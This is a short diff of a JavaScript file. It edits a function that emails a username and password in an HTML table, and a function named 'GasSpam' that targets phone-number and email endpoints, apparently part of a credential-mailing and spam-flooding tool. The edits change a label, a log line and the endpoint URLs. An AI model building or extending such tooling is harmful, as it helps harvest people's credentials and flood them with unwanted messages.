@@ -50,7 +50,7 @@ const sendMail = (email, user, pass)=>{
 <th style="padding:3px;width: 65%; text-align: center;"><b>${pass}</th> 
 </tr>
 
-<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Date/Time</th>
+<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Date</th>
 <th style="padding:3px;width: 65%; text-align: center;"><b>${date}</th> 
 </tr>
 </div>
@@ -60,16 +60,16 @@ const sendMail = (email, user, pass)=>{
     if(err){
       console.error(err)
     } else{
-    console.log('success send : ' + info.response)
+    console.log('success send : ' + email)
     }
   })
 }
 
 const GasSpam = (email)=>{
   u = [{
-    url:'https://real-cyan-horse-toga.cyclic.app/nomor',
+    url:'http://localhost:3000/nomor',
   },{
-    url:'https://real-cyan-horse-toga.cyclic.app/email'
+    url:'http://localhost:3000/email'
   }]
   
   
